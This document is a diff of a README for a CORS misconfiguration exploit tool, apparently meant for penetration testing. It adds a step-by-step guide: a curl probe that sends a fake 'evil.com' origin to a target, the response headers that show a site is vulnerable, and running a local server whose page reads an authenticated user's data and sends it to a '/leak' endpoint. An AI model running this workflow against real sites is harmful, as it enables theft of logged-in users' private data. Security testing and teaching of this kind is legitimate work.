@@ -61,31 +61,52 @@ This configuration instructs the browser to allow `attacker.com` to read respons
 
 ### Requirements
 
-- Python 3.6 or higher (uses standard library only)
-- Network access to target system
-- Browser for testing exploitation
+- Python 3.6+
+- Browser
 
-### Basic Usage
+### Step 1: Find a CORS Misconfiguration
+
+Test if the target reflects arbitrary origins:
 
 ```bash
-# Start the exploit server on localhost
-python3 cors_exploit.py
-
-# Access the exploit page in your browser
-# Replace the target parameter with the vulnerable endpoint
-http://127.0.0.1:9999/?target=http://vulnerable-site.com/api/sensitive
+curl -s -I -H "Origin: http://evil.com" https://target.com/api/endpoint | grep -i access-control
 ```
+
+If you see this in the response, it's vulnerable:
+```http
+Access-Control-Allow-Origin: http://evil.com
+Access-Control-Allow-Credentials: true
+```
+
+### Step 2: Login to Target
+
+Open your browser and authenticate to the target application. Note which endpoint returns sensitive data (e.g., `/accountDetails`, `/api/user`).
+
+### Step 3: Run the Exploit
+
+```bash
+python3 cors_exploit.py
+```
+
+Then visit:
+```
+http://127.0.0.1:9999/?target=https://target.com/api/accountDetails
+```
+
+If the target has a CORS misconfiguration, the response data will appear in your terminal.
+
+### How It Works
+
+1. You visit the exploit page with `?target=<url>`
+2. Your browser sends `Origin: http://127.0.0.1:9999` to the target (automatically)
+3. If the target reflects that origin in `Access-Control-Allow-Origin`, the browser allows JavaScript to read the response
+4. The script captures the response and sends it to `/leak`
 
 ### Command Line Arguments
 
 ```bash
-# Syntax
-python3 cors_exploit.py [host] [port]
-
-# Examples
-python3 cors_exploit.py                    # Default: 127.0.0.1:9999
-python3 cors_exploit.py attacker.local     # Custom host, default port
-python3 cors_exploit.py attacker.local 8888  # Custom host and port
+python3 cors_exploit.py                      # Default: 127.0.0.1:9999
+python3 cors_exploit.py 0.0.0.0 8080         # Custom host and port
 ```
 
 ---
@@ -519,3 +540,4 @@ Payload:
 - Legacy cross-origin data access mechanism
 - Similar exploitation to CORS misconfigurations
 - Deprecated in favor of CORS
+
